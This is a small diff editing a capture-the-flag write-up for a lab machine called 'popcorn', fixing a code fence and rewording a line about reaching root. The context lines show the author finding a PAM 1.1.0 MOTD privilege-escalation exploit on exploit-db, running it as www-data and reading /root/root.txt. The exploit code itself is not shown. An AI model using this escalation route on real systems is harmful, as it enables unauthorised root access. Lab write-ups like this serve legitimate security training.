@@ -245,6 +245,7 @@ total 8
 4 drwxr-xr-x 2 george george 4096 Mar 17  2017 .
 4 drwxr-xr-x 3 george george 4096 Mar 17  2017 ..
 0 -rw-r--r-- 1 george george    0 Mar 17  2017 motd.legal-displayed
+```
 
 A quick Google of "motd.legal-displayed exploit" finds [this](https://www.exploit-db.com/exploits/14339). Gives a script to exploit PAM 1.1.0 which is used here for the MOTD:
 
@@ -279,7 +280,7 @@ www-data@popcorn:/tmp$ bash /tmp/pam_exploit.sh
 Password: <-- enter toor here
 ```
 
-Can now ssh on to box as root to get the flag:
+I'm now on box as root user so can get the flag:
 
 ```text
 root@popcorn:/tmp# cat /root/root.txt
